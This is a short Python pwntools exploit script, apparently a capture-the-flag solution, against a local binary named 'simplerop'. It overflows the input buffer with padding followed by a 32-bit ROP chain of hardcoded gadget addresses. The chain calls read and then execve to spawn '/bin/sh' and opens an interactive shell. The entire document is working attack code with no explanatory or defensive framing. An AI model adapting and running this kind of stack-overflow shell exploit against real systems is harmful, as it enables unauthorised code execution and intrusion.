
from pwn import *


r=process('./simplerop')

pop_eax_ret=0x080bae06
pop_ecx_ebx_ret=0x0806e851
pop_edx_ret=0x0806e82a

buf=0x080eb000-100

int_ret=0x0806eef0

rop=[
	pop_eax_ret,
	3,
	pop_ecx_ebx_ret,
	buf,
	0,
	pop_edx_ret,
	50,
	int_ret,
	pop_eax_ret,
	11,
	pop_ecx_ebx_ret,
	0,
	buf,
	pop_edx_ret,
	0,
	int_ret
]


r.sendline('a'*32+flat(rop))

sleep(3)

r.sendline('/bin/sh\x00')

r.interactive()


